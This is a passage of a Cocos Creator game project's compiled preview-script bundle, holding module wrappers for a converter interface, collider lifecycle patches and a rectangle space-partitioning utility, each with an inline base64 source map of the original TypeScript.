Q0FBQyxDQUFDO1NBQ2xGO1FBQ0QsSUFBSSxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxDQUFDLENBQUM7SUFDaEMsQ0FBQztJQWxDRDtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxPQUFPLEVBQUMsQ0FBQztrREFDakI7SUFHZjtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxPQUFPLEVBQUMsQ0FBQztnREFDbkI7SUFHYjtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxLQUFLLEVBQUMsQ0FBQztrREFDYjtJQUdqQjtRQURDLFFBQVEsQ0FBQyxFQUFDLFdBQVcsRUFBQyxJQUFJLEVBQUMsQ0FBQzs2Q0FDZjtJQUdkO1FBREMsUUFBUSxDQUFDLEVBQUMsV0FBVyxFQUFDLE1BQU0sRUFBQyxDQUFDOzZDQUNyQjtJQUdWO1FBREMsUUFBUSxDQUFDLEVBQUMsV0FBVyxFQUFDLEtBQUssRUFBQyxDQUFDOytDQUNsQjtJQUdaO1FBREMsUUFBUSxDQUFDLEVBQUMsV0FBVyxFQUFDLE9BQU8sRUFBRSxRQUFRLEVBQUMsV0FBVyxFQUFDLENBQUM7a0RBQ3ZDO0lBR2Y7UUFEQyxRQUFRLENBQUMsRUFBQyxXQUFXLEVBQUMsSUFBSSxFQUFFLFFBQVEsRUFBQyxvQkFBb0IsRUFBQyxDQUFDO2lEQUM5QztJQUdkO1FBREMsUUFBUSxDQUFDLEVBQUMsV0FBVyxFQUFDLE1BQU0sRUFBRSxRQUFRLEVBQUMsY0FBYyxFQUFDLENBQUM7bURBQ3hDO0lBM0JDLFVBQVU7UUFEOUIsT0FBTztPQUNhLFVBQVUsQ0FzQzlCO0lBQUQsaUJBQUM7Q0F0Q0QsQUFzQ0MsQ0F0Q3VDLEVBQUUsQ0FBQyxTQUFTLEdBc0NuRDtrQkF0Q29CLFVBQVUiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IEFjdGlvbnMgZnJvbSBcIi4uL2FjdGlvbnMvQWN0aW9uc1wiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBab29tRWZmZWN0IGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi5byA5aeL57yp5pS+5YC8XCJ9KVxyXG4gICAgc3RhcnRWYWx1ZSA9IDE7XHJcblxyXG4gICAgQHByb3BlcnR5KHtkaXNwbGF5TmFtZTpcIue7k+adn+e8qeaUvuWAvFwifSlcclxuICAgIGVuZFZhbHVlID0gMTtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi57yp5pS+5beuXCJ9KVxyXG4gICAgZGVsdGFWYWx1ZSA9IDAuMTtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi6YCf5bqmXCJ9KVxyXG4gICAgc3BlZWQgPSAxLzAuODtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi57yp5pS+5qyh5pWwXCJ9KVxyXG4gICAgdGltZXMgPSAwO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7ZGlzcGxheU5hbWU6XCLoobDlh4/lgLxcIn0pXHJcbiAgICBkYW1waW5nID0gMDtcclxuXHJcbiAgICBAcHJvcGVydHkoe2Rpc3BsYXlOYW1lOlwi5ZGo5pyf5oCn5bu25pe2XCIsIHRleHRUaXBzOlwi5Y2V5pGG5Yiw5pyA6auY54K55pe25bu25pe2XCJ9KVxyXG4gICAgY3ljbGVEZWxheSA9IDA7XHJcblxyXG4gICAgQHByb3BlcnR5KHtkaXNwbGF5TmFtZTpcIumHjeWkjVwiLCB0ZXh0VGlwczpcIuWwj+S6jumbtuihqOekunJlcGVhdEZvcmV2ZXJcIn0pXHJcbiAgICByZXBlYXROdW0gPSAwO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7ZGlzcGxheU5hbWU6XCLph43lpI3lu7bml7ZcIiwgdGV4dFRpcHM6XCLph43lpI3mrKHmlbDkuI3nrYnkuo4w5pe25omN5pyJ5pWIXCJ9KVxyXG4gICAgcmVwZWF0RGVsYXkgPSAwO1xyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgbGV0IGFjdGlvbiA9IEFjdGlvbnMuY3ljbGVBY3Rpb24oY2Muc2NhbGVUbywgdGhpcy5zdGFydFZhbHVlLCB0aGlzLmVuZFZhbHVlLCB0aGlzLmRlbHRhVmFsdWUsIHRoaXMuc3BlZWQsIHRoaXMudGltZXMsIHRoaXMuZGFtcGluZywgdGhpcy5jeWNsZURlbGF5KTtcclxuICAgICAgICBpZiAodGhpcy5yZXBlYXROdW0gPiAwKXtcclxuICAgICAgICAgICAgYWN0aW9uID0gY2MucmVwZWF0KGNjLnNlcXVlbmNlKGFjdGlvbiwgY2MuZGVsYXlUaW1lKHRoaXMucmVwZWF0RGVsYXkpKSwgdGhpcy5yZXBlYXROdW0pO1xyXG4gICAgICAgIH0gZWxzZSBpZiAodGhpcy5yZXBlYXROdW0gPCAwKXtcclxuICAgICAgICAgICAgYWN0aW9uID0gY2MucmVwZWF0Rm9yZXZlcihjYy5zZXF1ZW5jZShhY3Rpb24sIGNjLmRlbGF5VGltZSh0aGlzLnJlcGVhdERlbGF5KSkpO1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGFjdGlvbik7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/converter/IConverter.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '9d93bWtokZFdpeixHUZwVgA', 'IConverter');
// framework/converter/IConverter.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvY29udmVydGVyL0lDb252ZXJ0ZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQUEsb0JBQW9CO0FBQ3BCLGlGQUFpRjtBQUNqRix5RkFBeUY7QUFDekYsbUJBQW1CO0FBQ25CLDJGQUEyRjtBQUMzRixtR0FBbUc7QUFDbkcsOEJBQThCO0FBQzlCLDJGQUEyRjtBQUMzRixtR0FBbUc7O0FBRTdGLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiLy8gTGVhcm4gVHlwZVNjcmlwdDpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvdHlwZXNjcmlwdC5odG1sXHJcbi8vIExlYXJuIEF0dHJpYnV0ZTpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL3JlZmVyZW5jZS9hdHRyaWJ1dGVzLmh0bWxcclxuLy8gTGVhcm4gbGlmZS1jeWNsZSBjYWxsYmFja3M6XHJcbi8vICAtIFtDaGluZXNlXSBodHRwOi8vZG9jcy5jb2Nvcy5jb20vY3JlYXRvci9tYW51YWwvemgvc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy9saWZlLWN5Y2xlLWNhbGxiYWNrcy5odG1sXHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcblxyXG4vKipcclxuICpcclxuICog5rOo5oSPIO+8mlxyXG4gMS7lrp7njrDnsbvkuI3og73nlKhjY2NsYXNz5L+u6aWwXHJcbiAyLuWunueOsOexu+WxnuaAp+W/hemhu+WIneWni+WMlijlgLzkuI3og73kuLp1bmRlZmluZWTvvIzlj6/ku6XkuLpudWxsKVxyXG4gKiAqL1xyXG5leHBvcnQgaW50ZXJmYWNlIElDb252ZXJ0ZXJ7XHJcblxyXG4gICAgZW5jb2RlKCk7XHJcblxyXG4gICAgZGVjb2RlKGRhdGE6YW55KTtcclxufVxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/cccollider.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '2d489o5zLFFiJWbSuWZB11w', 'cccollider');
// framework/extend/cccollider.ts

cc.Collider.prototype.onLoad = function () {
    // console.log("cc.Collider.onLoad");
    cc.director.getCollisionManager().initCollider(this);
};
cc.Collider.prototype.onDisable = function () {
    // console.log("cc.Collider.onDisable");
};
cc.Collider.prototype.onEnable = function () {
    // console.log("cc.Collider.onEnable");
};

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL2NjY29sbGlkZXIudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsRUFBRSxDQUFDLFFBQVEsQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHO0lBQzNCLHFDQUFxQztJQUNyQyxFQUFFLENBQUMsUUFBUSxDQUFDLG1CQUFtQixFQUFFLENBQUMsWUFBWSxDQUFDLElBQUksQ0FBQyxDQUFDO0FBQ3pELENBQUMsQ0FBQztBQUVGLEVBQUUsQ0FBQyxRQUFRLENBQUMsU0FBUyxDQUFDLFNBQVMsR0FBRztJQUM5Qix3Q0FBd0M7QUFDNUMsQ0FBQyxDQUFDO0FBRUYsRUFBRSxDQUFDLFFBQVEsQ0FBQyxTQUFTLENBQUMsUUFBUSxHQUFHO0lBQzdCLHVDQUF1QztBQUMzQyxDQUFDLENBQUMiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuY2MuQ29sbGlkZXIucHJvdG90eXBlLm9uTG9hZCA9IGZ1bmN0aW9uICgpIHtcclxuICAgIC8vIGNvbnNvbGUubG9nKFwiY2MuQ29sbGlkZXIub25Mb2FkXCIpO1xyXG4gICAgY2MuZGlyZWN0b3IuZ2V0Q29sbGlzaW9uTWFuYWdlcigpLmluaXRDb2xsaWRlcih0aGlzKTtcclxufTtcclxuXHJcbmNjLkNvbGxpZGVyLnByb3RvdHlwZS5vbkRpc2FibGUgPSBmdW5jdGlvbiAoKSB7XHJcbiAgICAvLyBjb25zb2xlLmxvZyhcImNjLkNvbGxpZGVyLm9uRGlzYWJsZVwiKTtcclxufTtcclxuXHJcbmNjLkNvbGxpZGVyLnByb3RvdHlwZS5vbkVuYWJsZSA9IGZ1bmN0aW9uICgpIHtcclxuICAgIC8vIGNvbnNvbGUubG9nKFwiY2MuQ29sbGlkZXIub25FbmFibGVcIik7XHJcbn07Il19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/extend/SpacePartition.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '1e0c0hTQv9M4Y9mgmNZ7No5', 'SpacePartition');
// framework/extend/SpacePartition.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var SpacePartition = /** @class */ (function () {
    function SpacePartition() {
    }
    SpacePartition_1 = SpacePartition;
    SpacePartition.randomSpace = function (partitions, width, height) {
        var arr = partitions.filter(function (value) { return value.width > width && value.height > height; });
        if (arr.length === 0)
            return null;
        var index = Math.floor(Math.random() * arr.length) % arr.length;
        var partition = arr[index];
        var x = partition.xMin + Math.random() * (partition.width - width);
        var y = partition.yMin + Math.random() * (partition.height - height);
        var result = cc.rect(x, y, width, height);
        /** 跟它相交的要重新划分 */
        this.partitionRect(partitions, result);
        return result;
    };
    SpacePartition.randomSpaces = function (partitions, width, height, count) {
        var result = [];
        for (var i = 0; i < count; i++) {
            var rect = this.randomSpace(partitions, width, height);
            if (rect) {
                result.push(rect);
            }
            else {
                break;
            }
        }
        return result;
    };
    SpacePartition.partitionRect = function (out, rect, minWidth, minHeight) {
        if (minWidth === void 0) { minWidth = 0; }
        if (minHeight === void 0) { minHeight = 0; }
        var list = out.splice(0);
        list.forEach(function (value) {
            var intersection = new cc.Rect();
            value.intersection(intersection, rect);
            if (intersection.width > 0 && intersection.height > 0) {
                SpacePartition_1.partitionRects(out, value, [rect], minWidth, minHeight);
            }
            else {
                out.push(value);
            }
        });
    };
    /** 根据相交拆分矩形 */
    SpacePartition.partitionRects = function (out, rect, intersects, minWidth, minHeight) {
        if (rect.width < minWidth || rect.height < minHeight) {
            return;
        }
        if (intersects.length == 0) {
            //干净的空间
            out.push(rect);
            return;
        }
        var cutRect = intersects.pop();
        //左
        if (rect.xMin < cutRect.xMin) {
            var leftRect_1 = cc.rect(rect.xMin, rect.yMin, cutRect.xMin - rect.xMin, rect.height);
            this.partitionRects(out, leftRect_1, intersects.filter(function (value) {
                var intersection = new cc.Rect();
                value.intersection(intersection, leftRect_1);
                return intersection.width > 0 && intersection.height > 0;
            }), minWidth, minHeight);
        }
        //右
        if (rect.xMax > cutRect.xMax) {
            var rightRect_1 = cc.rect(cutRect.xMax, rect.yMin, rect.xMax - cutRect.xMax, rect.height);
            this.partitionRects(out, rightRect_1, intersects.filter(function (value) {
                var intersection = new cc.Rect();
                value.intersection(intersection, rightRect_1);
                return intersection.width > 0 && intersection.height > 0;
            }), minWidth, minHeight);
        }
        //上
        if (rect.yMax > cutRect.yMax) {
            var upRect_1 = cc.rect(rect.xMin, cutRect.yMax, rect.width, rect.yMax - cutRect.yMax);
            this.partitionRects(out, upRect_1, intersects.filter(function (value) {
                var intersection = new cc.Rect();
                value.intersection(intersection, upRect_1);
                return intersection.width > 0 && intersection.height > 0;
            }), minWidth, minHeight);
        }
        //下
        if (rect.yMin < cutRect.yMin) {
            var downRect_1 = cc.rect(rect.xMin, rect.yMin, rect.width, cutRect.yMin - rect.yMin);
            this.partitionRects(out, downRect_1, intersects.filter(function (value) {
                var intersection = new cc.Rect();
                value.intersection(intersection, downRect_1);
                return intersection.width > 0 && intersection.height > 0;
            }), minWidth, minHeight);
        }
    };
    var SpacePartition_1;
    SpacePartition = SpacePartition_1 = __decorate([
        ccclass
    ], SpacePartition);
    return SpacePartition;
}());
exports.default = SpacePartition;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvZXh0ZW5kL1NwYWNlUGFydGl0aW9uLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDTSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFBO0lBOEZBLENBQUM7dUJBOUZvQixjQUFjO0lBRXhCLDBCQUFXLEdBQWxCLFVBQW1CLFVBQXlCLEVBQUUsS0FBWSxFQUFFLE1BQWE7UUFDckUsSUFBSSxHQUFHLEdBQUcsVUFBVSxDQUFDLE1BQU0sQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLEtBQUssQ0FBQyxLQUFLLEdBQUcsS0FBSyxJQUFJLEtBQUssQ0FBQyxNQUFNLEdBQUcsTUFBTSxFQUE1QyxDQUE0QyxDQUFDLENBQUM7UUFDbkYsSUFBSSxHQUFHLENBQUMsTUFBTSxLQUFLLENBQUM7WUFBQyxPQUFPLElBQUksQ0FBQztRQUNqQyxJQUFJLEtBQUssR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLElBQUksQ0FBQyxNQUFNLEVBQUUsR0FBRyxHQUFHLENBQUMsTUFBTSxDQUFDLEdBQUMsR0FBRyxDQUFDLE1BQU0sQ0FBQztRQUM5RCxJQUFJLFNBQVMsR0FBRyxHQUFHLENBQUMsS0FBSyxDQUFDLENBQUM7UUFDM0IsSUFBSSxDQUFDLEdBQUcsU0FBUyxDQUFDLElBQUksR0FBRyxJQUFJLENBQUMsTUFBTSxFQUFFLEdBQUMsQ0FBQyxTQUFTLENBQUMsS0FBSyxHQUFHLEtBQUssQ0FBQyxDQUFDO1FBQ2pFLElBQUksQ0FBQyxHQUFHLFNBQVMsQ0FBQyxJQUFJLEdBQUcsSUFBSSxDQUFDLE1BQU0sRUFBRSxHQUFDLENBQUMsU0FBUyxDQUFDLE1BQU0sR0FBRyxNQUFNLENBQUMsQ0FBQztRQUVuRSxJQUFJLE1BQU0sR0FBRyxFQUFFLENBQUMsSUFBSSxDQUFDLENBQUMsRUFBRSxDQUFDLEVBQUUsS0FBSyxFQUFFLE1BQU0s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QyxLQUFLLENBQUMsWUFBWSxDQUFDLFlBQVksRUFBRSxRQUFNLENBQUMsQ0FBQztnQkFDekMsT0FBTyxZQUFZLENBQUMsS0FBSyxHQUFHLENBQUMsSUFBSSxZQUFZLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQztZQUM3RCxDQUFDLENBQUMsRUFBRSxRQUFRLEVBQUUsU0FBUyxDQUFDLENBQUE7U0FDM0I7UUFFRCxHQUFHO1FBQ0gsSUFBSSxJQUFJLENBQUMsSUFBSSxHQUFHLE9BQU8sQ0FBQyxJQUFJLEVBQUM7WUFDekIsSUFBSSxVQUFRLEdBQUcsRUFBRSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxFQUFFLElBQUksQ0FBQyxJQUFJLEVBQUUsSUFBSSxDQUFDLEtBQUssRUFBRSxPQUFPLENBQUMsSUFBSSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQztZQUNuRixJQUFJLENBQUMsY0FBYyxDQUFDLEdBQUcsRUFBRSxVQUFRLEVBQUUsVUFBVSxDQUFDLE1BQU0sQ0FBQyxVQUFBLEtBQUs7Z0JBQ3RELElBQUksWUFBWSxHQUFHLElBQUksRUFBRSxDQUFDLElBQUksRUFBRSxDQUFDO2dCQUNqQyxLQUFLLENBQUMsWUFBWSxDQUFDLFlBQVksRUFBRSxVQUFRLENBQUMsQ0FBQztnQkFDM0MsT0FBTyxZQUFZLENBQUMsS0FBSyxHQUFHLENBQUMsSUFBSSxZQUFZLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQztZQUM3RCxDQUFDLENBQUMsRUFBRSxRQUFRLEVBQUUsU0FBUyxDQUFDLENBQUE7U0FDM0I7SUFDTCxDQUFDOztJQTdGZ0IsY0FBYztRQURsQyxPQUFPO09BQ2EsY0FBYyxDQThGbEM7SUFBRCxxQkFBQztDQTlGRCxBQThGQyxJQUFBO2tCQTlGb0IsY0FBYyIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFNwYWNlUGFydGl0aW9uICB7XHJcblxyX